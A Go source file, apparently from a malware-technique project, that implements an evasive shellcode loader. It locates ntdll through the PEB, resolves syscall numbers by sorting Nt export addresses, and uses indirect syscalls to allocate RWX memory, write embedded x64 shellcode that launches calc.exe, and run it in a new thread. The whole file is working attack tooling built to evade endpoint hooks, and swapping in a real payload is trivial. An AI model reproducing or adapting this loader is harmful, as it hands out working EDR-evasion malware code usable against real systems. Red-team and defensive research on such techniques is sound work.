package main

import (
	"fmt"
	"gomal/native"
	"sort"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

func main() {

	var PEB_LDR_DATA uintptr = uintptr(native.PtrToUInt64(uintptr(unsafe.Add(unsafe.Pointer(native.GetPEB()), 0x18))))
	var pInLoadOrderModuleList = uintptr(unsafe.Add(unsafe.Pointer(PEB_LDR_DATA), 0x10))
	var listEntry native.LIST_ENTRY = *(*native.LIST_ENTRY)(unsafe.Pointer(*&pInLoadOrderModuleList))
	var dataTableEntry native.LDR_DATA_TABLE_ENTRY = *(*native.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(*&listEntry.Flink))
	for {
		if strings.HasSuffix(native.BytePtrToStringUni((*byte)(unsafe.Pointer(dataTableEntry.FullDllName.Buffer))), "ntdll.dll") {
			fmt.Printf("Found ntdll at %#x\n", dataTableEntry.DllBase)
			break
		}
		dataTableEntry = *(*native.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(*&dataTableEntry.InOrderLinks.Flink))
	}

	var libAddr uintptr = dataTableEntry.DllBase
	getExports(libAddr)

	time.Sleep(50000 * time.Second)
}
func getExports(ntdllBase uintptr) {
	var NtFunctions []native.NeedName

	var elf uint16 = native.PtrToUInt16(ntdllBase + 0x3c)
	fmt.Printf("elf_anew value is: %d\n", elf)

	var optHeader uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), elf+0x18))
	fmt.Printf("OptHeader is at: %#x\n", optHeader)

	var pExport uintptr = uintptr(unsafe.Add(unsafe.Pointer(optHeader), 0x70))
	var exportRva uint32 = native.PtrToUInt32(pExport)
	var ordinalBase uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x10)))
	var numberOfNames uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x18)))
	var functionsRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x1c)))
	var namesRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x20)))
	var ordinalsRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x24)))

	fmt.Printf("There are %d names\n", numberOfNames)

	// Now to get the Nt functions
	for i := 0; i < int(numberOfNames); i++ {
		//var stringptr uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(namesRva)+i*4))))))
		var functionName string = native.BytePtrToStringAnsi((*byte)(unsafe.Pointer(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(namesRva)+i*4)))))))))
		if strings.HasPrefix(functionName, "Nt") && !strings.HasPrefix(functionName, "Ntdll") {
			//fmt.Printf("%s detected at %#x\n", functionName, stringptr)
			var functionOrdinal uint16 = uint16(ordinalBase) + native.PtrToUInt16(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(ordinalsRva)+i*2)))
			var functionRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), functionsRva+4*(uint32(functionOrdinal)-ordinalBase))))
			var functionPtr uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), functionRva))
			tmp := native.NeedName{FuncAddress: functionPtr, FuncName: functionName}
			NtFunctions = append(NtFunctions, tmp)
		}
	}

	// Populate the array
	NtFunctionsLowestToHighest := make([]uintptr, len(NtFunctions))
	for i := 0; i < len(NtFunctions); i++ {
		NtFunctionsLowestToHighest[i] = NtFunctions[i].FuncAddress
	}
	sort.SliceStable(NtFunctions, func(i, j int) bool {
		return NtFunctions[i].FuncAddress < NtFunctions[j].FuncAddress
	})
	// Sanity Check
	/*
		for i := 0; i < len(NtFunctions); i++ {
			fmt.Printf("%s has an ID of %d\n", NtFunctions[i].FuncName, i)
		}
	*/

	processHandle, _ := syscall.GetCurrentProcess()
	baseAddress := uintptr(0)
	zerobits := 0
	regionSize := 0x40000
	allocType := 0x3000
	protect := 0x40

	native.IndirectSyscall("NtAllocateVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(zerobits),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(uint64(allocType)),
		uintptr(uint64(protect)))
	fmt.Printf("Base address is now %#x\n", baseAddress)

	processHandle, _ = syscall.GetCurrentProcess()
	oldProt := 0
	native.IndirectSyscall("NtProtectVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(syscall.PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProt)),
	)

	var bytes []byte = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
		0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48,
		0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
		0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
		0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
		0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41,
		0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,
		0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
		0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0,
		0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6,
		0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
		0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
		0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
		0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0,
		0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
		0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
		0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
		0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,
		0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41,
		0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c,
		0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72,
		0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
		0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}
	var numberOfBytesWritten = 0
	native.IndirectSyscall("NtWriteVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(baseAddress),
		uintptr(unsafe.Pointer(&bytes[0])),
		uintptr(276),
		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
	)
	fmt.Printf("Wrote %d bytes to %#x\n", numberOfBytesWritten, baseAddress)

	var threadHandle uintptr = 0
	native.IndirectSyscall("NtCreateThreadEx",
		NtFunctions,
		uintptr(unsafe.Pointer(&threadHandle)),
		uintptr(0x02000000),
		uintptr(0),
		uintptr(processHandle),
		uintptr(baseAddress),
		uintptr(0),
		uintptr(0), //Idk how to cast bools so we use 1/0
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

}
